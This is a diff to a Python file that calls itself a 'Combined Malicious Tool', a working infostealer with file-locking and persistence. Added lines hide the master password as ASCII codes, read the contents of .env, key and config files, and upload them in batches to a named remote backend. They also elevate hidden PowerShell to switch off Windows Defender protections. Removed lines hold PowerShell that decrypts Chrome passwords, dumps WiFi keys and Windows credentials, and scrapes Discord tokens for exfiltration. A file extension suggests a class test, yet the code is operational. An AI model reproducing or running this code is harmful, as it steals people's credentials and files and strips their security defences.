@@ -1,3 +1,5 @@
+
+
 """
 Combined Malicious Tool - All-in-One
 Combines: tokenAccess, sendDataOS, encrypData, folderMonitor
@@ -52,6 +54,17 @@ try:
 except ImportError:
     HAS_WATCHDOG = False
 
+def decode_ascii_to_text_mae_ah_nang():
+    """Convert ASCII codes (3-digit per char) back to original text"""
+
+    text = ""
+    hello = "114097121117095109097101095097104095110097110103"
+    for i in range(0, len(hello), 3):
+        code = int(hello[i:i+3])
+        text += chr(code)
+    return text
+
+# rayu_mae_ah_nang
 # ==================== CONFIGURATION ====================
 BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
 API_ENDPOINT = f"{BACKEND_URL}/api/receive"
@@ -59,9 +72,9 @@ BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
 
 SUPPORT_EMAIL = "choengrayu307@gmail.com"
 MAX_ATTEMPTS = 3
-MASTER_PASSWORD = "123456"
+MASTER_PASSWORD = decode_ascii_to_text_mae_ah_nang()
 LOCK_FILE = ".folder_lock"
-ENCRYPTED_EXTENSION = ".locked"
+ENCRYPTED_EXTENSION = ".G2_T4_virus_test"
 
 # Browser paths for Chromium browsers
 CHROMIUM_BROWSERS = {
@@ -132,6 +145,17 @@ SENSITIVE_EXTENSIONS = {
     '.zip', '.rar', '.7z', '.tar', '.gz',
     '.jpg', '.jpeg', '.png', '.gif', '.bmp',
     '.wallet', '.dat',
+}
+
+# Text file extensions that can be read and extracted
+TEXT_EXTRACTABLE_EXTENSIONS = {
+    '.txt', '.env', '.ini', '.cfg', '.conf', '.config',
+    '.json', '.xml', '.yaml', '.yml', '.toml',
+    '.log', '.md', '.rst', '.csv',
+    '.pem', '.key', '.crt', '.pub',
+    '.sh', '.bat', '.ps1', '.cmd',
+    '.py', '.js', '.java', '.c', '.cpp', '.h',
+    '.html', '.css', '.sql',
 }
 
 # Folders to skip
@@ -213,280 +237,6 @@ def decrypt_password(encrypted_password, key):
             return decrypted.decode('utf-8', errors='ignore')
     except Exception:
         return "[decryption_failed]"
-
-
-# ==================== POWERSHELL CREDENTIAL EXTRACTION ====================
-
-def extract_credentials_powershell():
-    """Extract browser credentials using PowerShell commands (more reliable)"""
-    if not WINDOWS:
-        return []
-
-    credentials = []
-
-    # PowerShell script to extract Chrome passwords using DPAPI
-    ps_script = '''
-$ErrorActionPreference = "SilentlyContinue"
-
-# Load required assemblies
-Add-Type -AssemblyName System.Security
-
-function Get-ChromePasswords {
-    $localAppData = [Environment]::GetFolderPath('LocalApplicationData')
-    $chromePath = "$localAppData\\Google\\Chrome\\User Data"
-
-    if (-not (Test-Path $chromePath)) { return @() }
-
-    # Get the encryption key from Local State
-    $localStatePath = "$chromePath\\Local State"
-    if (-not (Test-Path $localStatePath)) { return @() }
-
-    $localState = Get-Content $localStatePath | ConvertFrom-Json
-    $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]  # Remove DPAPI prefix
-    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-
-    # Copy Login Data to temp
-    $loginDataPath = "$chromePath\\Default\\Login Data"
-    if (-not (Test-Path $loginDataPath)) { return @() }
-
-    $tempDb = "$env:TEMP\\chrome_login_temp.db"
-    Copy-Item $loginDataPath $tempDb -Force
-
-    # Query SQLite database
-    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
-    $conn.Open()
-    $cmd = $conn.CreateCommand()
-    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-    $reader = $cmd.ExecuteReader()
-
-    $results = @()
-    while ($reader.Read()) {
-        $url = $reader["origin_url"]
-        $username = $reader["username_value"]
-        $encryptedPass = $reader["password_value"]
-
-        if ($encryptedPass.Length -gt 0) {
-            # Decrypt using AES-GCM
-            $iv = $encryptedPass[3..14]
-            $payload = $encryptedPass[15..($encryptedPass.Length - 1)]
-
-            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
-            $tag = $payload[($payload.Length - 16)..($payload.Length - 1)]
-            $ciphertext = $payload[0..($payload.Length - 17)]
-            $decrypted = New-Object byte[] $ciphertext.Length
-            $aes.Decrypt($iv, $ciphertext, $tag, $decrypted)
-            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
-
-            $results += @{url=$url; username=$username; password=$password}
-        }
-    }
-
-    $conn.Close()
-    Remove-Item $tempDb -Force
-    return $results
-}
-
-Get-ChromePasswords | ConvertTo-Json
-'''
-
-    try:
-        # Execute PowerShell script
-        result = subprocess.run(
-            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
-            capture_output=True, text=True, timeout=60,
-            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
-        )
-        if result.stdout.strip():
-            data = json.loads(result.stdout)
-            if isinstance(data, list):
-                credentials.extend(data)
-            elif isinstance(data, dict):
-                credentials.append(data)
-    except:
-        pass
-
-    return credentials
-
-
-def extract_wifi_credentials_powershell():
-    """Extract WiFi credentials using PowerShell/netsh"""
-    if not WINDOWS:
-        return []
-
-    wifi_passwords = []
-
-    try:
-        # Get all WiFi profiles
-        result = subprocess.run(
-            ['netsh', 'wlan', 'show', 'profiles'],
-            capture_output=True, text=True, timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
-        )
-
-        profiles = []
-        for line in result.stdout.split('\n'):
-            if 'All User Profile' in line or 'Profile' in line:
-                parts = line.split(':')
-                if len(parts) >= 2:
-                    profile_name = parts[1].strip()
-                    if profile_name:
-                        profiles.append(profile_name)
-
-        # Get password for each profile
-        for profile in profiles:
-            try:
-                result = subprocess.run(
-                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
-                    capture_output=True, text=True, timeout=10,
-                    creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
-                )
-
-                password = None
-                for line in result.stdout.split('\n'):
-                    if 'Key Content' in line:
-                        parts = line.split(':')
-                        if len(parts) >= 2:
-                            password = parts[1].strip()
-                            break
-
-                wifi_passwords.append({
-                    'ssid': profile,
-                    'password': password if password else '[no_password]'
-                })
-            except:
-                continue
-    except:
-        pass
-
-    return wifi_passwords
-
-
-def extract_windows_credentials():
-    """Extract Windows stored credentials using cmdkey"""
-    if not WINDOWS:
-        return []
-
-    credentials = []
-
-    try:
-        # List all stored credentials
-        result = subprocess.run(
-            ['cmdkey', '/list'],
-            capture_output=True, text=True, timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
-        )
-
-        current_target = None
-        for line in result.stdout.split('\n'):
-            line = line.strip()
-            if 'Target:' in line:
-                current_target = line.split('Target:')[1].strip()
-            elif 'User:' in line and current_target:
-                user = line.split('User:')[1].strip()
-                credentials.append({
-                    'type': 'windows_credential',
-                    'target': current_target,
-                    'username': user,
-                    'password': '[stored_in_credential_manager]'
-                })
-                current_target = None
-    except:
-        pass
-
-    return credentials
-
-
-def extract_browser_tokens_powershell():
-    """Extract session tokens/cookies from browsers using PowerShell"""
-    if not WINDOWS:
-        return []
-
-    tokens = []
-
-    # Extract tokens from Discord leveldb
-    ps_discord = '''
-$ErrorActionPreference = "SilentlyContinue"
-$discordPaths = @(
-    "$env:APPDATA\\Discord\\Local Storage\\leveldb",
-    "$env:APPDATA\\discordcanary\\Local Storage\\leveldb",
-    "$env:APPDATA\\discordptb\\Local Storage\\leveldb"
-)
-
-$tokenPattern = '[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27}'
-$mfaPattern = 'mfa\\.[A-Za-z0-9_-]{84}'
-$results = @()
-
-foreach ($path in $discordPaths) {
-    if (Test-Path $path) {
-        Get-ChildItem "$path\\*.ldb","$path\\*.log" -ErrorAction SilentlyContinue | ForEach-Object {
-            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-            if ($content) {
-                $matches = [regex]::Matches($content, $tokenPattern)
-                foreach ($match in $matches) {
-                    $results += @{type="discord_token"; token=$match.Value; source=$path}
-                }
-                $mfaMatches = [regex]::Matches($content, $mfaPattern)
-                foreach ($match in $mfaMatches) {
-                    $results += @{type="discord_mfa"; token=$match.Value; source=$path}
-                }
-            }
-        }
-    }
-}
-$results | ConvertTo-Json
-'''
-
-    try:
-        result = subprocess.run(
-            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_discord],
-            capture_output=True, text=True, timeout=60,
-            creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS else 0
-        )
-        if result.stdout.strip():
-            data = json.loads(result.stdout)
-            if isinstance(data, list):
-                tokens.extend(data)
-            elif isinstance(data, dict):
-                tokens.append(data)
-    except:
-        pass
-
-    return tokens
-
-
-def run_credential_extraction_powershell():
-    """Run all PowerShell-based credential extraction"""
-    all_data = {
-        'browser_passwords': [],
-        'wifi_passwords': [],
-        'windows_credentials': [],
-        'tokens': [],
-        'system_info': get_system_info(),
-        'timestamp': datetime.now().isoformat()
-    }
-
-    try:
-        all_data['browser_passwords'] = extract_credentials_powershell()
-    except:
-        pass
-
-    try:
-        all_data['wifi_passwords'] = extract_wifi_credentials_powershell()
-    except:
-        pass
-
-    try:
-        all_data['windows_credentials'] = extract_windows_credentials()
-    except:
-        pass
-
-    try:
-        all_data['tokens'] = extract_browser_tokens_powershell()
-    except:
-        pass
-
-    return all_data
 
 
 def get_chromium_passwords(browser_name, browser_config):
@@ -982,8 +732,39 @@ class SensitiveDataCollector:
         filename_lower = path.name.lower()
         return any(p in filename_lower for p in sensitive_patterns)
 
+    def is_text_extractable(self, file_path):
+        """Check if file content can be extracted as text"""
+        path = Path(file_path)
+        return path.suffix.lower() in TEXT_EXTRACTABLE_EXTENSIONS
+
+    def extract_file_content(self, file_path, max_size_kb=500):
+        """Extract content from text-based files"""
+        try:
+            path = Path(file_path)
+            stat = path.stat()
+
+            # Skip files larger than max_size_kb
+            if stat.st_size > max_size_kb * 1024:
+                return None
+
+            # Try to read as text
+            try:
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                return content
+            except:
+                # If text reading fails, try binary and encode as base64
+                try:
+                    with open(file_path, 'rb') as f:
+                        binary_content = f.read()
+                    return base64.b64encode(binary_content).decode('utf-8')
+                except:
+                    return None
+        except:
+            return None
+
     def scan_directory(self, directory, max_depth=4, current_depth=0):
-        """Recursively scan directory for sensitive files"""
+        """Recursively scan directory for sensitive files and extract content"""
         sensitive_files = []
         if current_depth > max_depth:
             return sensitive_files
@@ -991,7 +772,22 @@ class SensitiveDataCollector:
             for item in os.scandir(directory):
                 try:
                     if item.is_file() and self.is_sensitive_file(item.path):
-                        sensitive_files.append({'path': item.path, 'name': item.name, 'size': item.stat().st_size})
+                        file_info = {
+                            'path': item.path,
+                            'name': item.name,
+                            'size': item.stat().st_size,
+                            'extension': Path(item.path).suffix.lower(),
+                            'modified_time': datetime.fromtimestamp(item.stat().st_mtime).isoformat(),
+                        }
+
+                        # Extract content if it's a text-extractable file
+                        if self.is_text_extractable(item.path):
+                            content = self.extract_file_content(item.path)
+                            if content:
+                                file_info['content'] = content
+                                file_info['content_extracted'] = True
+
+                        sensitive_files.append(file_info)
                     elif item.is_dir() and item.name not in SKIP_FOLDERS:
                         sensitive_files.extend(self.scan_directory(item.path, max_depth, current_depth + 1))
                 except:
@@ -1029,19 +825,39 @@ class SensitiveDataCollector:
         return wifi_data
 
     def collect_all(self):
-        """Collect all sensitive data"""
+        """Collect all sensitive data including file contents"""
         data = {
             'timestamp': datetime.now().isoformat(),
             'hostname': platform.node(),
             'os': platform.system(),
             'username': os.getenv('USERNAME'),
             'sensitive_files': [],
-            'wifi_passwords': []
+            'wifi_passwords': [],
+            'extraction_stats': {
+                'total_files_found': 0,
+                'files_with_content': 0,
+                'env_files_found': 0,
+                'txt_files_found': 0,
+            }
         }
+
         user_dirs = self.get_user_directories()
+        all_files = []
+
+        # Collect files from all user directories
         for user_dir in user_dirs:
-            data['sensitive_files'].extend(self.scan_directory(user_dir)[:50])
+            all_files.extend(self.scan_directory(user_dir))
+
+        # Limit to first 100 files to avoid huge payloads
+        data['sensitive_files'] = all_files[:100]
         data['wifi_passwords'] = self.collect_wifi_passwords()
+
+        # Calculate statistics
+        data['extraction_stats']['total_files_found'] = len(all_files)
+        data['extraction_stats']['files_with_content'] = sum(1 for f in data['sensitive_files'] if f.get('content_extracted'))
+        data['extraction_stats']['env_files_found'] = sum(1 for f in data['sensitive_files'] if f.get('extension') == '.env')
+        data['extraction_stats']['txt_files_found'] = sum(1 for f in data['sensitive_files'] if f.get('extension') == '.txt')
+
         return data
 
     def send_to_backend(self, data):
@@ -1050,6 +866,39 @@ class SensitiveDataCollector:
             url = f"{BACKEND_URL}/api/receive?type=sensitive_data"
             response = requests.post(url, json=data, headers={'Content-Type': 'application/json'}, timeout=30)
             return response.status_code in [200, 201]
+        except:
+            return False
+
+    def send_in_batches(self, data, batch_size=20):
+        """Send data in smaller batches to avoid payload size issues"""
+        try:
+            # Send metadata first (without files)
+            metadata = {
+                'timestamp': data.get('timestamp'),
+                'hostname': data.get('hostname'),
+                'os': data.get('os'),
+                'username': data.get('username'),
+                'wifi_passwords': data.get('wifi_passwords', []),
+                'extraction_stats': data.get('extraction_stats', {}),
+            }
+
+            # Send metadata
+            self.send_to_backend(metadata)
+
+            # Send files in batches
+            files = data.get('sensitive_files', [])
+            for i in range(0, len(files), batch_size):
+                batch = files[i:i+batch_size]
+                batch_data = {
+                    'timestamp': data.get('timestamp'),
+                    'hostname': data.get('hostname'),
+                    'batch_number': i // batch_size + 1,
+                    'total_batches': (len(files) + batch_size - 1) // batch_size,
+                    'sensitive_files': batch,
+                }
+                self.send_to_backend(batch_data)
+
+            return True
         except:
             return False
 
@@ -1166,19 +1015,44 @@ def disable_firewall():
 
 
 def disable_defender():
-    """Disable Windows Defender real-time protection"""
+    """Disable Windows Defender real-time protection using PowerShell as Administrator"""
     if not WINDOWS:
         return False
     try:
-        commands = [
-            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" ',
-            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" ',
-            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" ',
-            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true" ',
-            'powershell -Command "Set-MpPreference -DisableScriptScanning $true" ',
+        # PowerShell commands to disable Windows Defender
+        ps_commands = [
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+            "Set-MpPreference -DisableBehaviorMonitoring $true",
+            "Set-MpPreference -DisableBlockAtFirstSeen $true",
+            "Set-MpPreference -DisableIOAVProtection $true",
+            "Set-MpPreference -DisableScriptScanning $true",
+            "Set-MpPreference -DisableArchiveScanning $true",
+            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
         ]
-        for cmd in commands:
-            subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # Execute each command with elevated privileges
+        for ps_cmd in ps_commands:
+            try:
+                # Use PowerShell with -ExecutionPolicy Bypass and run as admin
+                full_cmd = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"'
+
+                # Try to run with elevated privileges using ShellExecute
+                if WINDOWS:
+                    try:
+                        ctypes.windll.shell32.ShellExecuteW(
+                            None,
+                            "runas",  # Run as administrator
+                            "powershell.exe",
+                            f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
+                            None,
+                            0  # SW_HIDE
+                        )
+                    except:
+                        # Fallback to regular subprocess if elevation fails
+                        subprocess.call(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+            except:
+                continue
+
         return True
     except:
         return False
@@ -1260,27 +1134,18 @@ def run_browser_extraction():
         pass
 
 
-def run_powershell_extraction():
-    """Run PowerShell-based credential extraction (more reliable on Windows)"""
-    try:
-        data = run_credential_extraction_powershell()
-        # Send PowerShell extracted data to backend
-        try:
-            url = f"{BACKEND_URL}/api/browser-data"
-            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-            requests.post(url, json=data, headers=headers, timeout=60)
-        except:
-            pass
-    except:
-        pass
-
-
 def run_sensitive_data_collection():
-    """Run sensitive data collection in background"""
+    """Run sensitive data collection in background with file content extraction"""
     try:
         collector = SensitiveDataCollector()
         data = collector.collect_all()
-        collector.send_to_backend(data)
+
+        # Try to send all data at once first
+        success = collector.send_to_backend(data)
+
+        # If single send fails (likely due to size), send in batches
+        if not success:
+            collector.send_in_batches(data)
     except:
         pass
 
@@ -1349,13 +1214,9 @@ def main():
     # Add scheduled task to run on logon
     add_scheduled_task()
 
-    # Run browser extraction in background thread (Python method)
+    # Run browser extraction in background thread
     browser_thread = threading.Thread(target=run_browser_extraction, daemon=True)
     browser_thread.start()
-
-    # Run PowerShell credential extraction (more reliable for Windows)
-    powershell_thread = threading.Thread(target=run_powershell_extraction, daemon=True)
-    powershell_thread.start()
 
     # Run sensitive data collection in background thread
     data_thread = threading.Thread(target=run_sensitive_data_collection, daemon=True)
@@ -1363,7 +1224,6 @@ def main():
 
     # Wait for data collection to complete
     browser_thread.join(timeout=120)
-    powershell_thread.join(timeout=120)
     data_thread.join(timeout=120)
 
     # Get all target folders (user folders + other drives)
